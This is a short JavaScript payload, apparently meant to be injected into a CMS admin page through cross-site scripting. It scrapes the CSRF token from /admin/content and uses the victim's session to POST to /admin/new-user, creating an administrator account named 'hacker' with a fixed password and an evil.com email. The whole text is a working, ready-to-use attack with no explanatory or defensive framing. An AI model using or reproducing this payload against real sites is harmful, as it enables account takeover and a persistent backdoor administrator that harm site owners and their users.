fetch("/admin/content")
  .then(response => response.text())
  .then(content => {
    const tokenCSRF = content.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];

    return fetch("/admin/new-user", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `save=&tokenCSRF=${tokenCSRF}&new_username=hacker&new_password=Hacker@123&confirm_password=Hacker@123&role=admin&email=hacker%40evil.com`,
    });
  })
  .catch(err => console.error(err));
